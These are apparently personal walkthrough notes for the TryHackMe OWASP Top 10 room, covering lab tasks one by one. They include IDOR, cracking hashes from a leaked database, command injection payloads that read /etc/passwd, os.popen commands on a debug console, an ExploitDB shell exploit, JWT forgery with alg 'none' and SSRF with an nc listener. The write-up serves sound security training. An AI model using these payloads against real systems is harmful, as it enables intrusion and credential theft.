## TASK 4 - IDOR CHALLENGE
#idor #web_exp 

Okay, so to solve this task, once you login with provided credentials, which is `noot` & `test1234` as username and passwd, respectively, you are greeted with some kind of **note page**, with some kind of list on it!

If you notice the URL, there is a `note_id=1` part in there, based on what the task is about, I started messing with it, and the first thing I do, is go in a reverse order, which gave me the flag instantly, which is not the motive, **go in an increasing order, like `2, 3, 4,...` and so on, and at some point, it'll give you the hint to go backwards!**

## TASK 8 - CRYPTOGRAPHIC FAILURES (CHALLENGE)
#cryptography #web_exp #hashcracking  [[ENCRYPTION-DECRYPTION]]

*So this was a bit of manual, not tricky!*
First up, for finding the directory, a quick source page inspection showed only few other web pages, one was `login.php`, where we went and found the note as said in the question, also referring to our target directory, which is `/assets`.
> It's rare for devs to leave note in `.css` files, so I mostly go for main `.html, .php, .js` and such files! But it doesn't mean to not check those out, once you are done with these first.

In the `/assets` directory, we found some other direcs(I'll call it this from here on) and a `webapp.db` file, which could be a `flat-file` (For more: [[Overview - OWASP Top 10 vulnerabilities (2021)#-> TASK 6 - CRYPTOGRAPHIC FAILURES (SUPPORTING MATERIAL 1)]]). Download it wherever it is you keep these files.
>WARNING: Since it's beginning, I suggest to keep files and stuff organized, else it's gonna be a big mess later on, IF you keep the files!

Open a terminal in the downloaded folder, run the commands shown in the support material (which you'd know if you gave them a thorough read! **Lazy bum!**), from where you get all kinds of info, such as `userID, username, password, admin status` and such, of course, in hashes.

Crack those using the [CrackStation](https://crackstation.net/), which is also given in the [task](https://tryhackme.com/r/room/owasptop102021). After cracking those hashes, login with the credentials you now have and viola! You have all the answers needed for this task!

## TASK 10 - COMMAND INJECTION
**Now this one here is very technical!** If you wanna know how things are working here, why are we doing it the way we are doing it, check out the explanation from the task, I won't do that here.
The constants in this one will be the cow, which is `default` and remain default, and in the input string, `$()` will be another constant, where, whatever we'll put/run command in, will be between the `()`. Based on answers required, now, we will run certain commands, *the usual Linux ones*.
1. For the strange file

		$(ls -a)

2. No. of non root/service/daemon users

		$(cat /etc/passwd)

Now look at the list carefully, while considering this...
- Each line in this file represents a user and contains fields separated by colons (`:`).
- The first field is the username.
- The third field is the user ID (UID).
- **0**: Typically the root user.
- **1-99** or **1-999**: Reserved for system and daemon accounts (ranges can vary based on distribution).
- Exclude the `nobody` user, which is often a special user for unprivileged tasks.

What this basically means is that, consider users with `UID` >= 1000.
Once done, you'll see there are none, hence giving our answer as **`0`**.

3 & 4. What user is running the app and **what the shell**?(Haha, gotcha!) - You saw just in previous commands end line, it's `******` and the shell is `/sbin/login`.

5. As for version...

		$(cat /etc/os-release)
And that'll be `*.**.*` for you, go do it by yourself!

## TASK 11 - INSECURE DESIGN
This one can be put somewhere in the middle, not very tough but neither easy.
What you need to do is given in the task. As far as getting inside joseph's account, our only is to reset.
**Reset Questions?** Except for the colour one, the other 2 are out of scope. Using that question, now comes the worst part for any hacker, but don't worry! The task is not that cruel to us, just don't guess any weird colour names, try some from `VIBGYOR` if you know what that means! You'll be successful to reset the password!
Once logged in, pry upon all the files and you'll  find the flag!

## TASK 12 - SECURITY MISCONFIGURATION
The first 2 questions of this task are pretty standard, and if you think likewise, then the third one is gonna be standard for you as well!

First up, go to `/console` just as stated in the question. As for second question, run the command given below-

	python import os; print(os.popen("ls -l").read())

Its related to python if you don't know what it means, refer to [[PYTHON - Intermediate]], or you can refer to your own research, your choice!
Running this command will provide you for your second question! Now for the third, there's just a tiny adjustment in the above python prompt-

	python import os; print(os.popen("cat app.py").read())

Glance over the whole code(it's not big), and you'll find the last answer of this task as well!

## TASK 15 - VULNERABLE / OUTDATED COMPONENTS
**This one was basically a pain in the butt!** Because the whole time, I kept looking for the wrong exploit! Based on what the website says, you'd probably look for a `CSE BookStore` named exploit.... **NO!**, you dummy! Look for `online book store` instead, it'll find the correct exploit [@exploitDB](https://www.exploit-db.com/).

Once you find the exploit, which will be pretty easy(*sarcasm*), download it, and run it through terminal with this command-

	python3 47887.py http:https://10.10.44.152:84/

It'll prompt a `launch shell confirmation`. Just send `y`.
Then there, `cat` the file told in question-

	cat /opt/flag.txt

You're task is complete!

## TASK 17 - IDENTIFICATION & AUTHENTICATION FAILURES
There's not much for me to tell here, its `textbook`, just do what the task says, and repeat, it'll be done!

## TASK 19 - SOFTWARE INTEGRITY FAILURES
Same as before, standard `textbook` procedure, *but do read what the task says, it'll teach some basics of how to securely implement third-party libraries into your web apps or websites*.

## TASK 20 - DATA INTEGRITY FAILURES
**This one is more-so about `SESSION COOKIES` thing! But I'm nowhere near saying that this is an easy task!!!**

**Cookies** *are key-value pairs that a web application will store on the user's browser and that will be automatically repeated on each request to the website that issued them*.
First up, try any random login, it'll tell you a *guest user and passwd* right off! Sign in with those credentials. but now a nice and sweet message, *ain't no flag for no damn guests! OnlyAdmins* 😂. **So now what do we do?**
Get the `jwt-session` cookie from the dev tools on the browser, and as shown in the task example, do what it did...

	eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw
- Just like this is in 3 parts separated by `.` , remove the last signature part but keep the last period(.).
- Separately, decode them (they are base 64)
- Make these changes in them!
![[Pasted image 20240606163304.png]]
Even after changing it won't like that, don't worry, it's not supposed to. It would probably look something like this-

	eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzE3NjczNzQ5fQ==.

Once done this bit, join them in the cookie value separately, keep the last period(.) press enter and refresh the page! **Viola**, the flag is all yours!

## TASK 21 - SECURITY LOGGIN & MONITORING FAILURES
Nothing much to do practically, just download the file and answer based on what you understand!
> The `file` kept getting flagged as malicious file, should definitely put that out to TryHackMe to check why is that so!

Nothing else to say for this task

## TASK 22 - SERVER-SIDE REQUEST FORGERY (SSRF)
This one was teeny-tiny tough if you lack some knowledge of Linux, about `nc` or `NetCat` to be precise! Apart from that, **pretty cool!**
As for the questions, here's how I did it.
- Admin area, if you *try* to go to that page, it clearly states who is allowed there!
- When you press `download resume`, it state quite clearly where the server parameter points to, **if you have the ability to read the URL, of course!** Of if you wanna do it the **hard way, check the page elements** and somewhere there you'll find the same thing!
- As for the **API Key**, this is where `nc` comes in handy

		nc -lnvp 8087
is the command you'll run on your terminal, and then going back to the website,
in the URL, replace the IP at start with your attack box IP and viola, YOU have the API Key!

**EXTRA CREDIT:**
[ You don't need this flag to complete, but it's a nice way to test what you know, and gives an opportunity to learn even more by doing your own research! ]

We know that only `localhost` can access the **admin area**. Can be done by changing server to localhost and admin by using this:

	server=http://localhost:8087/admin#&id=75482342
but to get our flag from this, we need to break-up `server` from `id`, if you pick up the right track to research, you'll find it out as `obfuscation`. Sometimes it can be seen as `escaping the #`.
Nothing just some fancy stuff if you don't know anything about it, if you wanna know, read about it [here](https://www.w3schools.com/tags/ref_urlencode.asp?_sm_au_=iVVDMg0TSmrMV6Dm).

Just encode the `#` from URL into `%23`, and then change the URL from:
this

	http://10.10.182.198:8087/download?server=secure-file-storage.com:8087&id=75482342
to this

	http://10.10.182.198:8087/download?server=http://localhost:8087/admin%23&id=75482342

And you'll get your last flag! 

~~ ROOM COMPLETE ~~